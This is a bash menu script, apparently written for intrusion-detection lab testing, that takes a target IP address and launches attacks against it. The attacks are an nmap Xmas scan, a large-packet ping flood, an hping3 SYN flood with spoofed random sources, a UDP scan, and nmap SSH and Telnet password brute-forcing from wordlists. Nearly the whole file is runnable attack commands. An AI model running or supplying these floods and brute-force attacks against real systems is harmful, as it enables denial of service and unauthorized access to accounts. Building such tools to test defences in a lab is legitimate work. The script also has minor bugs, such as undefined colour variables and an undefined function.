#!/bin/bash

#Bash menu script
# STan
#The script accepts IP address from the user and display menu option to simulate some simple attacks
#get IP address from user input
# read IP address

echo " enter ip address: "
read ip_add

echo " you entered this IP: "
echo $ip_add

#path defined
MYPATH=/home/Desktop/scripts
echo "The directory is: "
echo $MYPATH


#ip_add=$(IP_add)

function Xmas-Scan(){
    echo ""
    echo "you choose Xmas-Scan"
    #Xmas Scan
   # hping3 $ip_add --flood --rand-source --destport 22 -c 250 --syn --ack --fin --rst --push --urg --xmas
    nmap -sX -p 22 $ip_add
    echo "DoS Attack - Xmas Scanning; if you want to stop scanning, kill the process by pressing Ctrl+X for more options available"
}
function ICMP-Flood(){
    echo ""
    echo "you choose ICMP/Ping Flood - random source IP "
    ping -f -s 56500 $ip_add
}

function SYN-Flood(){
    echo ""
    echo "you choose SYN flooding"
    #hping3 $ip_add --flood --rand-source --syn --ack
    hping3 -S $ip_add --flood --rand-source
}

function UDP-Scan(){
    echo ""
    echo "you choose UDP flooding"
    nmap -sUV -T4 $ip_add
}

function SSH-Brute(){
    echo ""
    echo "you choose SSH"
    nmap -v --script ssh-brute -p22 $ip_add --script-args userdb=$MYPATH/users.txt,passdb=$MYPATH/password-lists-update.txt -oN $MYPATH/SSH-Brute-nmap.txt
    echo "The output file is saved under home/Desktop/scripts/Bruteforce-ssh-nmap.txt"
}

function Telnet-Brute(){
     echo "Modify Community Rule - Telnet server - login incorrect"
     echo ""
     echo "you choose Telnet Bruteforce"
     nmap -v --script telnet-brute -p23 $ip_add --script-args userdb=$MYPATH/users.txt,passdb=$MYPATH/password-lists-update.txt -oN $MYPATH/Telnet-Brute-nmap-Snort.txt

}


function all_checks(){
    Xmas-Scan
    ICMP-Flood
    SYN-Flood
    UDP-Scan
    SSH-Brute
    Telnet-Brute   
}

##
# Color Variables
##
green='\e[32m'
blue='\e[34m'
#clear='\e[0m"

##
# Color Functions

##

ColorGreen(){
    echo -ne $green$1$clear
}

ColorBlue(){
    echo -ne $blue$1$clear
}

menu(){

    echo -ne "
    Choose Option Menu
    $(ColorGreen '1)') Xmas-Scan
    $(ColorGreen '2)') ICMP-Flood    
    $(ColorGreen '3)') SYN-Flood
    $(ColorGreen '4)') UDP-Scan
    $(ColorGreen '5)') SSH-Brute
    $(ColorGreen '6)') Telnet-Brute
    $(ColorGreen '7') Check All
    $(ColorGreen '0)') Exit
    $(ColorBlue 'Choose an option:')"

    read a
    case $a in
        1) Xmas-Scan ; menu ;;
	2) ICMP-Flood ; menu ;;
	3) SYN-Flood ; menu ;;
	4) UDP-Scan ; menu ;;
	5) SSH-Brute ; menu ;;
	6) Telnet-Brute ; menu ;;
	7) all_checks ; menu ;;
        0) exit 0 ;;
        *) echo -e $red"Wrong option."$clear;WrongCommand;;
    esac
}

#Call the menu function
menu

#fi
